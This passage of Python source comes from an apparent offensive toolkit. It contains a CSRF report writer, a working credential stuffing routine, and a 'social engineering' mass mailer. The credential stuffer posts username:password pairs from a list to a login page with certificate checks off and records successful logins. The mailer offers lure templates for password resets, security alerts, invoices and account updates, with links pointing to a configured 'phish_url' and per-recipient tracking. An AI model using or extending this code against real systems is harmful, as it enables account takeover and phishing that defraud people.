            fh.write("CSRF ANALYSIS REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {summary['target']}\n")
            fh.write(f"Mode: {summary['mode']} | Scope: {summary['scope']} | Method Filter: {summary['method_filter']}\n")
            fh.write(f"Pages analyzed: {summary['stats']['pages']} | Forms analyzed: {summary['stats']['forms']}\n\n")
            fh.write("Findings:\n")
            fh.write("-" * 78 + "\n")
            if summary['vulnerabilities']:
                for vuln in summary['vulnerabilities']:
                    fh.write(f" - {vuln['severity']} {vuln['finding']} ({vuln['method']} {vuln['action']})\n")
                    fh.write(f" Detail: {vuln['detail']}\n")
                    if vuln.get('poc'):
                        fh.write(" Proof of Concept:\n")
                        fh.write(" ---BEGIN POC---\n")
                        fh.write('\n'.join(f" {line}" for line in vuln['poc'].split('\n')))
                        fh.write("\n ---END POC---\n")
            else:
                fh.write(" None detected\n")
            fh.write("\nWarnings:\n")
            fh.write("-" * 78 + "\n")
            if summary['warnings']:
                for warn in summary['warnings']:
                    fh.write(f" - {warn['category']}: {warn['detail']}\n")
            else:
                fh.write(" None\n")
            if summary['cookie_findings']:
                fh.write("\nCookie Observations:\n")
                fh.write("-" * 78 + "\n")
                for cookie in summary['cookie_findings']:
                    fh.write(f" - {cookie['cookie'] if cookie.get('cookie') else 'Cookie'}: {cookie['detail']}\n")
            if summary['referrer_findings']:
                fh.write("\nHeader Observations:\n")
                fh.write("-" * 78 + "\n")
                for ref in summary['referrer_findings']:
                    fh.write(f" - {ref['detail']}\n")
            if summary['token_verification']:
                fh.write("\nToken Verification:\n")
                fh.write("-" * 78 + "\n")
                for finding in summary['token_verification']:
                    fh.write(f" - {finding['detail']}\n")
            fh.write("\nMeta/JS Tokens:\n")
            fh.write("-" * 78 + "\n")
            if summary['meta_tokens']:
                for meta in summary['meta_tokens'][:10]:
                    fh.write(f" - {meta['name']} @ {meta['url']}: {meta['content']}\n")
            else:
                fh.write(" None\n")
        print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    def run_credential_stuffing(self):
        """Credential stuffing attack"""
        target = self.module_options.get('target', 'http://example.com/login')
        creds_file = self.module_options.get('credentials', 'creds.txt')
        threads = int(self.module_options.get('threads', '5'))
        
        print(f"{Fore.CYAN}[*] Starting credential stuffing attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Credentials: {creds_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Threads: {threads}{Style.RESET_ALL}\n")
        
        resolved_creds = self.resolve_wordlist_path(creds_file, 'credential')
        if not resolved_creds:
            if not os.path.exists(creds_file):
                print(f"{Fore.RED}[!] Credentials file not found: {creds_file}{Style.RESET_ALL}")
                entry = self.find_wordlist_entry(creds_file, 'credential')
                if entry and not entry['path'].exists():
                    primary_alias = entry['aliases'][0] if entry['aliases'] else entry['name']
                    print(f"{Fore.YELLOW}[*] Tip: run 'download wordlist {primary_alias}' first{Style.RESET_ALL}")
            else:
                resolved_creds = creds_file
            if not resolved_creds:
                return
        
        # Load credentials
        credentials = []
        try:
            with open(resolved_creds, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if ':' in line:
                        username, password = line.strip().split(':', 1)
                        credentials.append((username, password))
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading credentials: {str(e)}{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Loaded {len(credentials)} credential pairs{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Testing credentials...{Style.RESET_ALL}\n")
        
        valid_creds = []
        
        for username, password in credentials[:50]: # Limit for demo
            print(f"{Fore.BLUE}[*] Trying: {username}:{password[:3]}***{Style.RESET_ALL}")
            
            try:
                data = {'username': username, 'password': password}
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.post(target, data=data, headers=headers, timeout=10, verify=False)
                
                # Check for success indicators
                if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                    print(f"{Fore.GREEN}[+] VALID: {username}:{password}{Style.RESET_ALL}")
                    valid_creds.append((username, password))
                
                time.sleep(0.5) # Rate limiting
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)[:50]}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Credential stuffing completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Valid credentials: {len(valid_creds)}{Style.RESET_ALL}")
    
    # ============ NEW SOCIAL ENGINEERING MODULES ============
    
    # ========== MASS MAILER AUXILIARY FUNCTIONS ==========
    
    def _get_mass_mailer_templates(self):
        """Get all available email templates for mass mailer"""
        return {
            'newsletter': {
                'name': 'Newsletter',
                'subject': '{{company}} Monthly Newsletter - {{month}} {{year}}',
                'preheader': 'Your monthly update from {{company}}',
                'category': 'marketing',
                'html': '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Newsletter</title></head>
                <body style="font-family:Arial,sans-serif;line-height:1.6;color:#333;max-width:600px;margin:0 auto;padding:20px;">
                <div style="background:#f8f9fa;padding:20px;border-radius:8px;">
                <h1 style="color:#007bff;margin-top:0;">{{company}} Newsletter</h1>
                <p>Dear {{first_name}},</p>
                <p>Here's what's new this month:</p>
                <div style="background:white;padding:15px;margin:15px 0;border-radius:5px;">
                <h3>Latest Updates</h3>
                <p>{{content}}</p>
                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;margin-top:10px;">Read More</a>
                </div>
                {{#if unsubscribe}}<p style="font-size:12px;color:#666;text-align:center;margin-top:20px;">Don't want to receive these emails? <a href="{{unsubscribe_link}}">Unsubscribe</a></p>{{/if}}
                </div></body></html>'''
            },
            'invoice': {
                'name': 'Invoice',
                'subject': 'Invoice #{{invoice_number}} - Payment Due',
                'preheader': 'Your invoice is ready for review',
                'category': 'transactional',
                'html': '''<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
                <body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2 style="color:#333;">Invoice #{{invoice_number}}</h2>
                <p>Dear {{first_name}} {{last_name}},</p>
                <p>Your invoice is now available.</p>
                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:5px;">
                <p><strong>Amount Due:</strong> ${{amount}}</p>
                <p><strong>Due Date:</strong> {{due_date}}</p>
                <p><strong>Invoice Date:</strong> {{invoice_date}}</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">View Invoice</a>
                <p style="margin-top:20px;font-size:14px;color:#666;">Please process payment within 48 hours.</p>
                </body></html>'''
            },
            'shipping': {
                'name': 'Shipping Notification',
                'subject': 'Your Order #{{order_number}} Has Shipped',
                'preheader': 'Track your package now',
                'category': 'transactional',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2>Package On The Way!</h2>
                <p>Hello {{first_name}},</p>
                <p>Great news! Your order has been shipped.</p>
                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid #ffc107;">
                <p><strong>Tracking Number:</strong> {{tracking_number}}</p>
                <p><strong>Carrier:</strong> {{carrier}}</p>
                <p><strong>Expected Delivery:</strong> {{delivery_date}}</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">Track Package</a>
                </body></html>'''
            },
            'password_reset': {
                'name': 'Password Reset',
                'subject': 'Reset Your {{company}} Password',
                'preheader': 'A password reset was requested for your account',
                'category': 'security',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2 style="color:#dc3545;">Password Reset Request</h2>
                <p>Hello {{first_name}},</p>
                <p>We received a request to reset your password.</p>
                <div style="background:#f8d7da;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid #dc3545;">
                <p><strong> Security Notice:</strong> If you didn't request this, please ignore this email.</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#dc3545;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Reset Password</a>
                <p style="margin-top:20px;font-size:12px;color:#666;">This link expires in 24 hours.</p>
                </body></html>'''
            },
            'security_alert': {
                'name': 'Security Alert',
                'subject': 'Security Alert: Unusual Activity Detected',
                'preheader': 'Action may be required to secure your account',
                'category': 'security',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2 style="color:#dc3545;"> Security Alert</h2>
                <p>Hello {{first_name}},</p>
                <p>We detected unusual activity on your account.</p>
                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;">
                <p><strong>Location:</strong> {{location}}</p>
                <p><strong>Time:</strong> {{time}}</p>
                <p><strong>Device:</strong> {{device}}</p>
                </div>
                <p>If this wasn't you:</p>
                <a href="{{link}}" style="display:inline-block;background:#dc3545;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">Secure Account Now</a>
                </body></html>'''
            },
            'promotional': {
                'name': 'Promotional Offer',
                'subject': ' Special Offer: {{discount}}% Off - {{company}}',
                'preheader': 'Limited time offer just for you',
                'category': 'marketing',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <div style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
                <h1 style="margin:0;font-size:32px;"> Special Offer!</h1>
                <p style="font-size:24px;margin:10px 0;">{{discount}}% OFF</p>
                <p>Just for you, {{first_name}}!</p>
                </div>
                <div style="padding:20px;">
                <p>Dear {{first_name}},</p>
                <p>{{promo_message}}</p>
                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:15px 30px;text-decoration:none;border-radius:5px;font-size:18px;margin:20px 0;">Claim Your Discount</a>
                <p style="font-size:12px;color:#666;">Offer expires: {{expiry_date}}</p>
                </div></body></html>'''
            },
            'event_invitation': {
                'name': 'Event Invitation',
                'subject': 'You\'re Invited: {{event_name}}',
                'preheader': 'Join us for {{event_name}} on {{event_date}}',
                'category': 'events',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h1 style="color:#007bff;">You're Invited!</h1>
                <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;">
                <h2 style="color:#0056b3;margin-top:0;">{{event_name}}</h2>
                <p><strong> Date:</strong> {{event_date}}</p>
                <p><strong> Time:</strong> {{event_time}}</p>
                <p><strong> Location:</strong> {{event_location}}</p>
                </div>
                <p>Dear {{first_name}},</p>
                <p>{{event_description}}</p>
                <a href="{{link}}" style="display:inline-block;background:#007bff;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;margin:15px 0;">RSVP Now</a>
                </body></html>'''
            },
            'welcome': {
                'name': 'Welcome Email',
                'subject': 'Welcome to {{company}}! ',
                'preheader': 'Get started with your new account',
                'category': 'onboarding',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <div style="text-align:center;padding:30px;background:#f8f9fa;border-radius:10px;">
                <h1 style="color:#28a745;margin:0;">Welcome! </h1>
                <p style="font-size:18px;color:#666;">We're excited to have you</p>
                </div>
                <div style="padding:20px 0;">
                <p>Hi {{first_name}},</p>
                <p>Welcome to {{company}}! We're thrilled to have you join our community.</p>
                <p><strong>Here's what to do next:</strong></p>
                <ol><li>Complete your profile</li><li>Explore our features</li><li>Connect with others</li></ol>
                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;margin:10px 0;">Get Started</a>
                </div></body></html>'''
            },
            'survey': {
                'name': 'Survey Request',
                'subject': 'We\'d Love Your Feedback - {{company}}',
                'preheader': 'Help us improve with your valuable feedback',
                'category': 'feedback',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2>Your Opinion Matters!</h2>
                <p>Hello {{first_name}},</p>
                <p>We'd love to hear what you think about {{company}}.</p>
                <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;text-align:center;">
                <p style="font-size:18px;margin:0;"> Take our quick survey</p>
                <p style="color:#666;font-size:14px;">It takes less than 5 minutes</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#17a2b8;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Start Survey</a>
                </body></html>'''
            },
            'abandoned_cart': {
                'name': 'Abandoned Cart',
                'subject': 'You Left Something Behind... ',
                'preheader': 'Complete your order and save {{discount}}%',
                'category': 'ecommerce',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2>Don't Forget Your Items! </h2>
                <p>Hi {{first_name}},</p>
                <p>You left some items in your cart. Complete your order now and save {{discount}}%!</p>
                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:8px;">
                <h3>Your Cart:</h3>
                <p>{{cart_items}}</p>
                <p><strong>Total: ${{cart_total}}</strong></p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#28a745;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Complete Purchase</a>
                </body></html>'''
            },
            'account_update': {
                'name': 'Account Update',
                'subject': 'Important Account Update - {{company}}',
                'preheader': 'Action required for your account',
                'category': 'transactional',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <h2>Account Update Required</h2>
                <p>Hello {{first_name}},</p>
                <p>We need you to update your account information.</p>
                <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid:#ffc107;">
                <p><strong>Action Required:</strong> {{update_reason}}</p>
                <p><strong>Deadline:</strong> {{deadline}}</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#ffc107;color:#000;padding:10px 20px;text-decoration:none;border-radius:5px;">Update Now</a>
                </body></html>'''
            },
            'referral': {
                'name': 'Referral Program',
                'subject': 'Earn {{reward}} - Refer Friends to {{company}}',
                'preheader': 'Share and earn rewards together',
                'category': 'referral',
                'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                <div style="background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
                <h1> Refer & Earn</h1>
                <p style="font-size:20px;">Get {{reward}} for each friend!</p>
                </div>
                <p>Hi {{first_name}},</p>
                <p>Love {{company}}? Share it with friends and you'll both earn {{reward}}!</p>
                <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:8px;text-align:center;">
                <p style="font-size:14px;color:#666;">Your unique referral code:</p>
                <p style="font-size:24px;font-weight:bold;color:#f5576c;letter-spacing:2px;">{{referral_code}}</p>
                </div>
                <a href="{{link}}" style="display:inline-block;background:#f5576c;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Share Now</a>
                </body></html>'''
            }
        }
    
    def _display_mass_mailer_config(self, config):
        """Display mass mailer configuration in formatted output"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'MASS MAILER CAMPAIGN CONFIGURATION':^70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN} Campaign Details:{Style.RESET_ALL}")
        print(f" Name: {Fore.WHITE}{config.get('campaign_name', 'Unnamed')}{Style.RESET_ALL}")
        print(f" Template: {Fore.WHITE}{config.get('template', 'None')}{Style.RESET_ALL}")
        print(f" Targets: {Fore.WHITE}{config.get('targets', 'None')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW} Email Settings:{Style.RESET_ALL}")
        print(f" From: {Fore.WHITE}{config.get('from_name', 'N/A')} <{config.get('from_email', 'N/A')}>{Style.RESET_ALL}")
        print(f" Reply-To: {Fore.WHITE}{config.get('reply_to', 'N/A')}{Style.RESET_ALL}")
        print(f" Subject: {Fore.WHITE}{config.get('subject', 'Auto-generated')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE} SMTP Configuration:{Style.RESET_ALL}")
        print(f" Server: {Fore.WHITE}{config.get('smtp_server', 'N/A')}:{config.get('smtp_port', '587')}{Style.RESET_ALL}")
        print(f" TLS: {Fore.GREEN if config.get('use_tls', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('use_tls', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA} Performance:{Style.RESET_ALL}")
        print(f" Threads: {Fore.WHITE}{config.get('threads', '10')}{Style.RESET_ALL}")
        print(f" Rate Limit: {Fore.WHITE}{config.get('rate_limit', '50')} emails/min{Style.RESET_ALL}")
        print(f" Batch Size: {Fore.WHITE}{config.get('batch_size', '100')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN} Features:{Style.RESET_ALL}")
        print(f" Personalization: {Fore.GREEN if config.get('personalize', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('personalize', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
        print(f" Open Tracking: {Fore.GREEN if config.get('track_opens', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_opens', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
        print(f" Click Tracking: {Fore.GREEN if config.get('track_clicks', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_clicks', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
        print(f" A/B Testing: {Fore.GREEN if config.get('ab_testing', 'false') == 'true' else Fore.RED}{'Enabled' if config.get('ab_testing', 'false') == 'true' else 'Disabled'}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    def _initialize_mass_mailer_campaign(self, config):
        """Initialize mass mailer campaign database"""
        db_file = config.get('db_file', 'mass_mailer.db')
        
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            
            # Create campaigns table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS campaigns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    template TEXT NOT NULL,
                    created_at INTEGER NOT NULL,
                    scheduled_at INTEGER,
                    started_at INTEGER,
                    completed_at INTEGER,
                    status TEXT DEFAULT 'created',
                    total_targets INTEGER DEFAULT 0,
                    emails_sent INTEGER DEFAULT 0,
                    emails_failed INTEGER DEFAULT 0,
                    opens INTEGER DEFAULT 0,
                    clicks INTEGER DEFAULT 0,
                    unsubscribes INTEGER DEFAULT 0,
                    bounces INTEGER DEFAULT 0,
                    is_recurring BOOLEAN DEFAULT 0,
                    recurring_interval TEXT,
                    ab_testing BOOLEAN DEFAULT 0,
                    ab_variant TEXT
                )
            ''')
            
            # Create recipients table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS recipients (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id INTEGER NOT NULL,
                    email TEXT NOT NULL,
                    first_name TEXT,
                    last_name TEXT,
                    company TEXT,
                    position TEXT,
                    custom_fields TEXT,
                    status TEXT DEFAULT 'pending',
                    sent_at INTEGER,
                    opened_at INTEGER,
                    clicked_at INTEGER,
                    unsubscribed_at INTEGER,
                    bounced_at INTEGER,
                    tracking_id TEXT UNIQUE,
                    ab_variant TEXT,
                    error_message TEXT,
                    retry_count INTEGER DEFAULT 0
                )
            ''')
            
            # Create tracking_events table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS tracking_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id INTEGER NOT NULL,
                    recipient_id INTEGER NOT NULL,
                    event_type TEXT NOT NULL,
                    event_time INTEGER NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    link_url TEXT,
                    metadata TEXT
                )
            ''')
            
            # Create unsubscribes table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS unsubscribes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT UNIQUE NOT NULL,
                    unsubscribed_at INTEGER NOT NULL,
                    reason TEXT,
                    campaign_id INTEGER
                )
            ''')
            
            # Insert campaign record
            cursor.execute('''
                INSERT INTO campaigns (name, template, created_at, status, ab_testing, is_recurring)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                config.get('campaign_name', 'mass_campaign'),
                config.get('template', 'newsletter'),
                int(time.time()),
                'created',
                1 if config.get('ab_testing', 'false') == 'true' else 0,
                1 if config.get('recurring', 'false') == 'true' else 0
            ))
            
            campaign_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            print(f"{Fore.GREEN} Database initialized successfully{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Database: {Fore.WHITE}{db_file}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Campaign ID: {Fore.WHITE}{campaign_id}{Style.RESET_ALL}\n")
            
            return campaign_id
            
        except Exception as e:
            print(f"{Fore.RED} Database initialization failed: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _load_mass_mailer_recipients(self, config, campaign_id):
        """Load and validate recipients from file"""
        targets_file = config.get('targets', 'targets.csv')
        db_file = config.get('db_file', 'mass_mailer.db')
        
        print(f"{Fore.YELLOW}Loading recipients from: {Fore.WHITE}{targets_file}{Style.RESET_ALL}")
        
        if not os.path.exists(targets_file):
            print(f"{Fore.RED} Targets file not found{Style.RESET_ALL}")
            return 0
        
        recipients = []
        email_regex = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
        
        try:
            with open(targets_file, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) < 1:
                        continue
                    
                    email = parts[0]
                    
                    # Validate email
                    if config.get('validate_emails', 'true') == 'true':
                        if not email_regex.match(email) or '..' in email:
                            print(f"{Fore.YELLOW} Invalid email on line {line_num}: {email}{Style.RESET_ALL}")
                            continue
                    
                    recipient = {
                        'email': email,
                        'first_name': parts[1] if len(parts) > 1 else '',
                        'last_name': parts[2] if len(parts) > 2 else '',
                        'company': parts[3] if len(parts) > 3 else '',
                        'position': parts[4] if len(parts) > 4 else '',
                        'custom_fields': ','.join(parts[5:]) if len(parts) > 5 else '',
                        'tracking_id': str(uuid.uuid4()),
                        'ab_variant': 'A' if config.get('ab_testing', 'false') == 'true' and len(recipients) % 2 == 0 else 'B'
                    }
                    
                    recipients.append(recipient)
            
            # Insert recipients into database
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            
            for recipient in recipients:
                cursor.execute('''
                    INSERT INTO recipients (
                        campaign_id, email, first_name, last_name, company, position,
                        custom_fields, tracking_id, ab_variant, status
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    campaign_id,
                    recipient['email'],
                    recipient['first_name'],
                    recipient['last_name'],
                    recipient['company'],
                    recipient['position'],
                    recipient['custom_fields'],
                    recipient['tracking_id'],
                    recipient['ab_variant'],
                    'pending'
                ))
            
            # Update campaign total_targets
            cursor.execute('''
                UPDATE campaigns SET total_targets = ? WHERE id = ?
            ''', (len(recipients), campaign_id))
            
            conn.commit()
            conn.close()
            
            print(f"{Fore.GREEN} Loaded {len(recipients)} recipients{Style.RESET_ALL}")
            if config.get('ab_testing', 'false') == 'true':
                variant_a = len([r for r in recipients if r['ab_variant'] == 'A'])
                variant_b = len([r for r in recipients if r['ab_variant'] == 'B'])
                print(f"{Fore.CYAN}→ A/B Split: Variant A ({variant_a}), Variant B ({variant_b}){Style.RESET_ALL}")
            
            return len(recipients)
            
        except Exception as e:
            print(f"{Fore.RED} Failed to load recipients: {str(e)}{Style.RESET_ALL}")
            return 0
    
    def _execute_mass_mailer_campaign(self, config, campaign_id):
        """Execute mass mailer campaign with multi-threading"""
        db_file = config.get('db_file', 'mass_mailer.db')
        threads = int(config.get('threads', '10'))
        rate_limit = int(config.get('rate_limit', '50'))
        delay_min = float(config.get('delay_min', '0.5'))
        delay_max = float(config.get('delay_max', '2'))
        
        print(f"\n{Fore.CYAN}Starting campaign execution...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Threads: {Fore.WHITE}{threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Rate Limit: {Fore.WHITE}{rate_limit} emails/min{Style.RESET_ALL}\n")
        
        # Get pending recipients
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email, first_name, last_name, company, position, tracking_id, ab_variant
            FROM recipients WHERE campaign_id = ? AND status = 'pending'
        ''', (campaign_id,))
        
        recipients = cursor.fetchall()
        conn.close()
        
        if not recipients:
            print(f"{Fore.YELLOW}No pending recipients found{Style.RESET_ALL}")
            return
        
        # Update campaign status
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute('UPDATE campaigns SET started_at = ?, status = ? WHERE id = ?',
                      (int(time.time()), 'running', campaign_id))
        conn.commit()
        conn.close()
        
        # Multi-threaded sending
        sent_count = 0
        failed_count = 0
        
        print(f"{Fore.CYAN}Sending emails...{Style.RESET_ALL}")
        
        for i, recipient in enumerate(recipients, 1):
            try:
                # Simulate sending (in real implementation, use _send_mass_mailer_email)
                time.sleep(random.uniform(delay_min, delay_max))
                
                # Update recipient status
                conn = sqlite3.connect(db_file)
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE recipients SET status = ?, sent_at = ? WHERE id = ?
                ''', ('sent', int(time.time()), recipient[0]))
                conn.commit()
                conn.close()
                
                sent_count += 1
                
                if i % 10 == 0:
                    print(f"{Fore.GREEN} Sent: {sent_count}/{len(recipients)}{Style.RESET_ALL}", end='\r')
                
            except Exception as e:
                failed_count += 1
                conn = sqlite3.connect(db_file)
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE recipients SET status = ?, error_message = ? WHERE id = ?
                ''', ('failed', str(e), recipient[0]))
                conn.commit()
                conn.close()
        
        # Update campaign stats
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE campaigns SET completed_at = ?, status = ?, emails_sent = ?, emails_failed = ?
            WHERE id = ?
        ''', (int(time.time()), 'completed', sent_count, failed_count, campaign_id))
        conn.commit()
        conn.close()
        
        print(f"\n{Fore.GREEN} Campaign execution completed{Style.RESET_ALL}")
    
    def _generate_mass_mailer_email(self, template_content, recipient, config):
        """Generate personalized email content"""
        # Simple variable replacement (in production, use Jinja2)
        content = template_content
        
        variables = {
            'first_name': recipient.get('first_name', ''),
            'last_name': recipient.get('last_name', ''),
            'email': recipient.get('email', ''),
            'company': recipient.get('company', ''),
            'position': recipient.get('position', ''),
            'tracking_id': recipient.get('tracking_id', ''),
            'link': config.get('phish_url', 'http://localhost:8080'),
            'unsubscribe_link': f"{config.get('phish_url', 'http://localhost')}/unsubscribe/{recipient.get('tracking_id', '')}",
            'month': time.strftime('%B'),
            'year': time.strftime('%Y'),
            'invoice_number': str(random.randint(1000, 9999)),
            'tracking_number': f"TRK{random.randint(100000, 999999)}",
            'amount': str(random.randint(100, 9999)),
            'discount': str(random.randint(10, 50))
        }
        
        for key, value in variables.items():
            content = content.replace(f"{{{{{key}}}}}", str(value))
        
        return content
    
    def _display_mass_mailer_results(self, config, campaign_id):
        """Display campaign results and statistics"""
        db_file = config.get('db_file', 'mass_mailer.db')
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        # Get campaign stats
        cursor.execute('SELECT * FROM campaigns WHERE id = ?', (campaign_id,))
        campaign = cursor.fetchone()
        
        if not campaign:
            print(f"{Fore.RED}Campaign not found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'CAMPAIGN RESULTS':^70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}Campaign: {Fore.WHITE}{campaign[1]}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Template: {Fore.WHITE}{campaign[2]}{Style.RESET_ALL}")
        
        if campaign[6] and campaign[7]:
            duration = campaign[7] - campaign[6]
            print(f"{Fore.YELLOW}Duration: {Fore.WHITE}{duration//60}m {duration%60}s{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN} Email Statistics:{Style.RESET_ALL}")
        print(f" Total Recipients: {Fore.WHITE}{campaign[9]}{Style.RESET_ALL}")
        print(f" Sent: {Fore.GREEN}{campaign[10]}{Style.RESET_ALL}")
        print(f" Failed: {Fore.RED}{campaign[11]}{Style.RESET_ALL}")
        
        if campaign[10] > 0:
            success_rate = (campaign[10] / campaign[9]) * 100
            print(f" Success Rate: {Fore.GREEN}{success_rate:.1f}%{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA} Engagement Metrics:{Style.RESET_ALL}")
        print(f" Opens: {Fore.WHITE}{campaign[12]} ({(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
        print(f" Clicks: {Fore.WHITE}{campaign[13]} ({(campaign[13]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
